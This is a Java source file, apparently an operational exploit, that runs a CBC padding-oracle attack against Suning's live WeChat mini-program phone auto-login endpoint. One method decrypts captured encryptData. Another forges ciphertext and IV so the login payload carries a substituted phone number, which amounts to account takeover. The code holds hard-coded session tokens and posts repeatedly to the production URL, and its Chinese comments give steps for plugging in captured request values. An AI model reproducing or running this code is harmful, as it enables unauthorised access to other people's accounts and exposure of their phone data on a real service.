import com.alipay.api.AlipayApiErrorEnum;
import com.alipay.api.AlipayApiException;
import com.alipay.api.internal.util.codec.Base64;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Arrays;

public class ShuNing {

    /**
     * padding oracle 获取密文对应的明文
     * 利用，获取到关键请求包后，
     * cipherText 的值替换为请求中的encryptData 部分。
     * 将sendPostRequest 函数中， post的数据中的minitoken 替换为请求包中的minitoken，
     * 调用主函数。
     * @throws Exception
     */
    public static void deCipher() throws Exception{
        // padding orcale 获取明文
        //
        String cipherText = "9nR63gHViJf9Iokdsdr2IaNFr2c6X1OV80Z6zpxjBRMe3r13xw6LRzglmCqV/g2ZqzQJd7Zlj7dg7SR58zUPQLNnOaMc0JXV2Kwlug1l3qXKqWbZS+bQn7fYyv0d4Jz4qzkTlfTQ2SYNR/ep+SHs8fsW8MKqlzQfTg9glPbBoxfQoAgDEbRPb44iIuS9kjsVZD1tSneq7RQyWj1hHUAmEkFgX+Ww7b+ODs+UmJ5K4KM=";
        StringBuilder plainText = new StringBuilder("plainText : ");
        byte[] ivAndEncryptedText = Base64.decodeBase64(cipherText.getBytes());
        int cbcBlackNum = ivAndEncryptedText.length/16;
        byte[] iv;
        byte[] cipherTextBlock; // 密文块
        byte[] plainTexBlock = new byte[16]; // 明文块
        byte[] miv; // 中间值
        for(int i=0; i < cbcBlackNum-1; ++i ){
            // cbc加密算法每16位一组，
            // 前面的作为vi，后面的是密文, //
            iv = Arrays.copyOfRange(ivAndEncryptedText, i*16, i*16 +16);
            cipherTextBlock = Arrays.copyOfRange(ivAndEncryptedText, (i+1)*16, (i+1)*16 +16);

            miv = Util.getMiv(cipherTextBlock, (String contentText, String ivText)->{
                //JdkCrypt.decryptWithIv(contentText, AliSdk.secret, ivText);
                sendPostRequest(contentText, ivText);
            });
            Util.printByteArray("mvi", miv);
            for (int j = 0; j < 16; j++) plainTexBlock[j] = (byte)(iv[j] ^ miv[j]);
            Util.printByteArray("plainTexBlock", plainTexBlock);
            // 当前组密文对应的明文。
            System.out.print(" expr2 (" + new String(plainTexBlock) + ")");
            plainText.append(new String(plainTexBlock));
        }
        // 完整的明文。
        System.out.println(plainText.toString());
    }

    /**
     * padding orcale 伪造明文，
     * 1. 需要替换rawC1 为 请求包中的原始明文，
     * 2. 将sendPostRequest 函数中， post的数据中的minitoken 替换为请求包中的minitoken
     * 3. 主函数中调用该函数执行。
     * @throws Exception
     */
    public static void enCipher() throws Exception{
        // 明文格式：
        //{"phoneNumber":"13580006666","purePhoneNumber":"13580006666","countryCode":"86","watermark":{"appid":"xxxxxxxxxxxxxxxxxxx","timestamp": xxxxxx}}
        // 对于 微信的情况， 由于除了手机号外的部分，都不是我关心的密文，所以不需要伪造，只要伪造前4组密文就行了。
        //# 伪造密文。
        //要先计算出 miv
        // 因为有  miv xor vi = 明文，
        // 当 miv 已知的情况下， 可以
        // miv xor 要伪造的明文  =  需要输入的iv。
        //
        byte[] miv; // 中间值
        // 请求包中的原始密文。
        String  rawC1 = "TlsBrY50bFRo9D/3ZFE1P0hQuWwfBQmaZcvcwgDndvX7h5SPdFpRByrGjk2QjIVE0PeUggNGVweGP5M1TFgJST+4llrjf1tavCpDsIQ+R9qBVkntw2euiQAerK7wx62BMM8LER74zHV4Pw5rggTfsziB0S7zZgD9zjAk5DvyAhxKHZV2KcJPV6kfC5wVpoSEEwMiWD6Tq7jAx2Hh6+7FXg==";
        byte[] rawC1Byte = Base64.decodeBase64String(rawC1);
        // 需要伪造的密文， 由于我们不关心手机号之后的密文内容，所以只需要伪造和手机号有关系的密文块就行。
        // 也就是前4组密文， 对应的伪造密文如下：
        String targetPlainText = "{\"phoneNumber\":\"17338137976\",\"purePhoneNumber\":\"17338137976\",\"co";
        byte[] targetPlainByte = targetPlainText.getBytes();
        Util.printByteArray("targetPlainByte", targetPlainByte);
        //初始密文，组密文块理论上，第四组对应的明文应该是  `15874318974","co`
        byte[] cipherTextBlock =  Arrays.copyOfRange(rawC1Byte, 3*16, 3*16 +16);
        int cbcBlackNum = targetPlainByte.length/16;
        byte[] targetCipherText = Arrays.copyOfRange(rawC1Byte, 3*16, rawC1Byte.length);;
        byte[] targetCipherBlock;
        byte[] encryptedTextBlock = new byte[16];
        // 分块暴力破解 miv
        for(int i= cbcBlackNum; i > 0; i--) {
            targetCipherBlock = Arrays.copyOfRange(targetPlainByte, (i - 1) * 16, i * 16);
            Util.printByteArray("targetCipherBlock", targetCipherBlock);
            miv = Util.getMiv(cipherTextBlock, (String contentText, String ivText)->{
                //JdkCrypt.decryptWithIv(contentText, AliSdk.secret, ivText);
                sendPostRequest(contentText, ivText);
            });
            for (int j = 0; j < 16; j++) encryptedTextBlock[j] = (byte) (targetCipherBlock[j] ^ miv[j]);
            targetCipherText = Util.concat(encryptedTextBlock, targetCipherText);
            Util.printByteArray("targetCipherText", targetCipherText);
            //System.out.println(AliSdk.decryptPhone(s3));
            cipherTextBlock = encryptedTextBlock;
        }
        Util.printByteArray("encryptedTextBlock", targetCipherText);
        byte[] targetIv = Arrays.copyOfRange(targetCipherText, 0, 16);
        String targetIvStr = new String(Base64.encodeBase64(targetIv));
        byte[] targetCipherTextBlock = Arrays.copyOfRange(targetCipherText, 16, targetCipherText.length);
        String targetCipherTextStr = new String(Base64.encodeBase64(targetCipherTextBlock));
        System.out.println("获取到伪造的密文:" + targetCipherTextStr);
        Util.printByteArray("伪造的密文HEX", targetCipherTextBlock);
        Util.printByteArray("原始的密文HEX", rawC1Byte);
        System.out.println("获取到伪造的密文长度:" + targetCipherTextBlock.length);
        System.out.println("获取到伪造的iv:" + targetIvStr);
        Util.printByteArray("获取到伪造的密文iv", targetIv);
        System.out.println("获取到伪造的iv长度 :" + targetIv.length);


        //System.out.println("原文解密：" + JdkCrypt.decrypt(rawC1, AliSdk.secret, "UTF-8"));
        //System.out.println("解密" + JdkCrypt.decryptWithIv(targetCipherTextStr, AliSdk.secret, targetIvStr));
        sendPostRequest(targetCipherTextStr, targetIvStr);


    }


    public static void sendPostRequest(String encryptData, String iv) throws Exception {
        encryptData = URLEncoder.encode(encryptData);
        iv = URLEncoder.encode(iv);
        String requestUrl = "https://passport.suning.com/ids/mini/mainApp/phoneAutoLogin";
        URL url = new URL(requestUrl);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();

        // 设置请求方法和请求头
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Host", "passport.suning.com");
        connection.setRequestProperty("content-type", "application/x-www-form-urlencoded");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.44(0x18002c29) NetType/WIFI Language/zh_CN");
        connection.setRequestProperty("Referer", "https://servicewechat.com/wx681b1e78da02dd16/339/page-frame.html");

        // 设置允许输出
        connection.setDoOutput(true);

        // 写入POST数据
        //String postData = "encryptData=" + encryptData + "&iv=" + iv + "&&sysCode=wechat_temporary&createSource=257000000240&createChannel=208000201041&ip=103.37.140.24&dfpToken=TWVJZM18c58d990caxxbS73e8___w7DDuMKYwoR5w7kZbMOwKmzCq8OECsOLw7pRwqjCvcOk&detect=wx_mini&code=83a3874e387634fc2f7fcd30ec7278f4ad1f2db6006e850111ff44d80a0ab531&miniToken=907f50745eec47ca904edb7d84058a09&rememberMe=true";
        String postData = "encryptData=" + encryptData + "&iv=" + iv + "&sysCode=wechat_temporary&createSource=257000000240&createChannel=208000201041&ip=103.37.140.24&dfpToken=TW0iG618c7fd8a60eW6qrec45___w7DDuMO%2BwqdkwoIZbMOwKmzCoMOID8ODw71RwqvCtsOk&detect=wx_mini&code=a2d64acd29f286d7f81ab0ef3a1de5a13416a0f36cf20205e07b84cef87b27fc&miniToken=d2a67a308dd345d8aa7defe4f8c521b3&rememberMe=true";
        try (OutputStream os = connection.getOutputStream()) {
            os.write(postData.getBytes());
            os.flush();
        }

        // 获取响应状态
        int responseCode = connection.getResponseCode();
        System.out.println("Response Code : " + responseCode);
        if(responseCode == 403){
            try {
                // 403 后，随眠五秒后重试，
                Thread.sleep(10000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            sendPostRequest(encryptData, iv);
        }

        // 读取响应内容
        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String inputLine;
        StringBuilder content = new StringBuilder();
        while ((inputLine = in.readLine()) != null) {
            content.append(inputLine);
        }
        in.close();
        connection.disconnect();

        // 判断响应内容是否包含特定字符串
        if (content.toString().contains("40018")) {
            try {
                Thread.sleep(290);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            throw new AlipayApiException("40018");
        } else {
            System.out.println("解密成功" + content.toString());
        }
    }


    public static void main(String[] args) throws Exception {
        enCipher();
    }

}
